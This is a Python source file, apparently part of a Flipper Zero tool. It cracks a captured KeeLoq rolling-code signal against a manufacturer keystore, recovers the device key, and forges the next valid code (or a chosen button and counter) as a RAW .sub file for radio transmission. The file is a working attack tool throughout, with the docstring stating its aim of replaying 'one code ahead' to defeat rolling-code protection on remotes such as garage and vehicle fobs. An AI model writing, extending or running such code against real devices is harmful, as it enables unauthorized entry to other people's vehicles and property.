"""On-phone KeeLoq forge + transmit: crack a decoded KeeLoq .sub against the embedded manufacturer
keystore, recover the per-device key, then render the NEXT valid rolling code as a Flipper RAW .sub
(OOK pulses, timing ported from the firmware KeeLoq protocol: te_short=400, te_long=800,
bit1 = short-high/long-low, bit0 = long-high/short-low, 11-pulse preamble + te_short*10 sync gap,
64 data bits MSB-first). Transmit that .sub via the Flipper CC1101 to replay one code ahead."""
import json
import kl_crack

try:
    import keeloq_keys
    _KEYS = keeloq_keys.KEYS
except Exception:
    _KEYS = []

_TE_S = 400
_TE_L = 800
_DEFAULT_PRESET = "FuriHalSubGhzPresetOok650Async"


def _parse(text):
    data = 0; bit = 0; seed = 0; freq = 433920000; preset = _DEFAULT_PRESET
    for ln in text.splitlines():
        s = ln.strip()
        if s.startswith("Key:"):
            try: data = int(s.split(":", 1)[1].strip().replace(" ", ""), 16)
            except Exception: pass
        elif s.startswith("Bit:"):
            try: bit = int(s.split(":", 1)[1].strip())
            except Exception: pass
        elif s.startswith("Seed:"):
            try: seed = int(s.split(":", 1)[1].strip().replace(" ", ""), 16)
            except Exception: pass
        elif s.startswith("Frequency:"):
            try: freq = int(s.split(":", 1)[1].strip())
            except Exception: pass
        elif s.startswith("Preset:"):
            p = s.split(":", 1)[1].strip()
            if p and p != "Custom": preset = p
    return {"data": data, "bit": bit or 64, "seed": seed, "freq": freq, "preset": preset}


def _coalesce(p):
    out = []
    for d in p:
        if d == 0:
            continue
        if out and ((out[-1] > 0) == (d > 0)):
            out[-1] += d
        else:
            out.append(d)
    return out


def render_sub(data64, freq, preset, repeats=3):
    p = []
    for _ in range(repeats):
        for _ in range(11):
            p += [_TE_S, -_TE_S]            # preamble
        p += [_TE_S, -_TE_S * 10]           # sync gap
        for i in range(63, -1, -1):
            if (data64 >> i) & 1:
                p += [_TE_S, -_TE_L]        # bit 1
            else:
                p += [_TE_L, -_TE_S]        # bit 0
        p += [-_TE_S * 30]                  # inter-frame gap
    p = _coalesce(p)
    lines = ["RAW_Data: " + " ".join(str(x) for x in p[i:i + 512]) for i in range(0, len(p), 512)]
    return ("Filetype: Flipper SubGhz RAW File\nVersion: 1\nFrequency: %d\nPreset: %s\nProtocol: RAW\n%s\n"
            % (freq, preset, "\n".join(lines)))


def crack_info(sub_text):
    sub = _parse(sub_text)
    if not sub["data"]:
        return json.dumps({"ok": False, "error": "need a decoded KeeLoq .sub (Key: field)"})
    hits = kl_crack.crack(sub, _KEYS)
    if not hits:
        return json.dumps({"ok": False, "error": "no manufacturer key matched (%d in store)" % len(_KEYS)})
    out = [{"mf": h["mf"], "serial": "0x%07X" % h["serial"], "cnt": h["cnt"],
            "btn": h["btn"], "conf": h["conf"]} for h in hits[:4]]
    return json.dumps({"ok": True, "hits": out})


def forge_sub(sub_text, btn=-1, counter=-1):
    """Forge the next valid code (or a chosen button/counter) as a RAW .sub ready to TX."""
    sub = _parse(sub_text)
    if not sub["data"]:
        return json.dumps({"ok": False, "error": "need a decoded KeeLoq .sub (Key: field)"})
    hits = kl_crack.crack(sub, _KEYS)
    if not hits:
        return json.dumps({"ok": False, "error": "no manufacturer key matched (%d in store)" % len(_KEYS)})
    h = hits[0]
    if h["dev_key"] == 0:
        return json.dumps({"ok": False, "error": "%s is fixed-code — nothing to roll" % h["mf"]})
    serial28 = h["fix"] & 0x0FFFFFFF
    use_btn = h["btn"] if btn < 0 else (btn & 0xF)
    use_cnt = (h["cnt"] + 1) & 0xFFFF if counter < 0 else (counter & 0xFFFF)
    fix2 = ((use_btn & 0xF) << 28) | serial28
    _hop, data64 = kl_crack.keeloq_forward(fix2, h["dev_key"], use_cnt, h["disc10"], use_btn)
    return json.dumps({"ok": True, "mf": h["mf"], "serial": "0x%07X" % serial28, "btn": use_btn,
                       "cnt": use_cnt, "freq": sub["freq"],
                       "sub": render_sub(data64, sub["freq"], sub["preset"])})
